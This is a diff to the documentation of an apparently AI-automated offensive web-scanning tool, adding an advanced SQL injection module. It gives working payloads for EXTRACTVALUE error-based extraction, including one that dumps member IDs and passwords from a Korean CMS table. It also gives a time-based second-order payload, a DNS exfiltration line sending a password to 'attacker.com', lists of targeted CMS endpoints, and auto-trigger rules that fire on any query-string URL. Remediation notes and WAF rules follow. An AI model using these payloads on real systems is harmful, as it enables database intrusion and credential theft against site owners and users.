@@ -737,6 +737,108 @@ http://target.com/?html=
 
 ---
 
+### Advanced SQLi Exploit — EXTRACTVALUE Error-Based + Second-Order SQLi (v2.1)
+
+> **Research basis:**  
+> [Intigriti — "Exploiting SQL Injection Vulnerabilities: Advanced Exploitation Guide"](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-sql-injection-sqli-vulnerabilities)  
+> Published: April 30, 2026 (Updated June 10, 2026) — Author: Ayoub, Intigriti Senior Security Content Developer  
+> **Skill module:** `AdvancedSQLiExploit` (id: 52)
+
+#### New techniques beyond standard SQLi automation
+
+Two advanced exploitation techniques not covered by standard `sqlmap` delegation:
+
+**① EXTRACTVALUE Error-Based Exfiltration**
+
+Forces MySQL to throw an XPATH syntax error containing subquery output:
+
+```sql
+-- Extract current database name via error message
+1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))
+
+-- Extract credentials from Korean CMS member table
+1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(mb_id,0x3a,mb_password) FROM g5_member LIMIT 1)))
+
+-- CAST overflow fallback (when EXTRACTVALUE is filtered)
+1 AND EXP(~(SELECT * FROM (SELECT database()) x))
+```
+
+Response contains: `XPATH syntax error: '~target_database_name'` — direct data exfiltration without UNION or reflection.
+
+**② Second-Order (Stored) SQLi Detection**
+
+Input passes initial sanitization and is stored safely, but fires in a deferred async context:
+
+```
+Step 1: Store malicious payload in note/username/profile field
+         content = "test' AND SLEEP(7)-- -"
+
+Step 2: Trigger async action (email notification / scheduled reminder / export / report)
+
+Step 3: Measure time-gap between scheduled execution time and actual response
+         → 7-second delay in background job confirms second-order SQLi
+```
+
+**③ OOB DNS Exfiltration via LOAD_FILE**
+
+```sql
+-- Exfiltrate data via DNS lookup to attacker-controlled domain
+(SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\x')))
+```
+
+#### Attack Surface Coverage
+
+| Target | Parameters Tested |
+|--------|------------------|
+| `/bbs/board.php` | `bo_table`, `wr_id` |
+| `/shop/item.php` | `it_id` |
+| `/product/view.php` | `idx` |
+| `/board/view.php` | `idx` |
+| URL query string | All `?key=val` parameters |
+
+#### AI Auto-Trigger Conditions
+
+```python
+# Activate AdvancedSQLiExploit when:
+sqli_vulnerable == True          # prior SQLi scan confirmed injectable parameter
+OR parsed.query != ""            # URL contains query string parameters
+OR "board.php"/"view.php" in URL # Korean CMS CMS URL pattern detected
+OR "sqli"/"inject" in raw_findings  # SQLi indicators from prior scans
+```
+
+#### Second-Order Async Context Detection
+
+Automatically flags pages containing these indicators as potential second-order surfaces:
+`reminder` · `notification` · `scheduled` · `background job` · `email send` · `export` · `report` · `queue` · `batch` · `cron` · `task` · `async`
+
+#### EXTRACTVALUE Error Pattern Matched
+
+```
+XPATH syntax error: '~<extracted_value>'
+```
+
+Regex: `XPATH syntax error.*?'~([^'<]{1,200})'`
+
+#### Evidence Levels
+
+| Finding Type | Evidence Level | Condition |
+|---|---|---|
+| `error_based_extractvalue` | `VERIFIED` | XPATH error contains extracted data |
+| `time_based` | `LIKELY` | Response delay ≥ 85% of SLEEP() value |
+| `second_order` | `INFERRED` | Async contexts found in HTML |
+| `oob_dns` | `VERIFIED` | DNS callback received |
+
+#### Remediation
+
+1. **All SQL queries** → Prepared Statements / Parameterized Queries mandatory
+2. **Error messages** → `display_errors=Off`; never expose XPATH/DB errors to client
+3. **Second-order paths** → Treat DB-retrieved data as untrusted when reused in queries
+4. **EXTRACTVALUE/SLEEP** → WAF rules blocking `EXTRACTVALUE`, `CONCAT(0x7e`, `SLEEP(`
+5. **LOAD_FILE** → `REVOKE FILE ON *.* FROM 'user'@'host'`; DB server egress filtering
+6. **Async jobs** → Security audit all background job / cron / email-trigger code paths
+
+---
+
 ### Cloud Token Recon — Grafana → GCP Token → 507 Private Repos Chain (v2.1)
 
 > **Research basis:**  
@@ -1280,7 +1382,7 @@ bingo/
 - **IDOR Phase** — real-world IDOR enumeration, PII detection, and IDOR-based password reset with login verification
 - **Full i18n** — all UI strings (skill module names, commands, evidence labels) in Korean / Chinese / English
 - **9-phase pipeline** — extended from 5 to 9 phases (webshell acquisition, IDOR, login verification added)
-- **51 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45), CswshRceChain (#46), NextJsCacheSxss (#47), RedisDarkReplica (#48), HtmlAutofillSteal (#49), WebCacheDeception (#50), CloudTokenRecon (#51)
+- **52 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45), CswshRceChain (#46), NextJsCacheSxss (#47), RedisDarkReplica (#48), HtmlAutofillSteal (#49), WebCacheDeception (#50), CloudTokenRecon (#51), AdvancedSQLiExploit (#52)
 - Production-stable (`Development Status :: 5 - Production/Stable`)
 
 ### v2.0.x — Beta
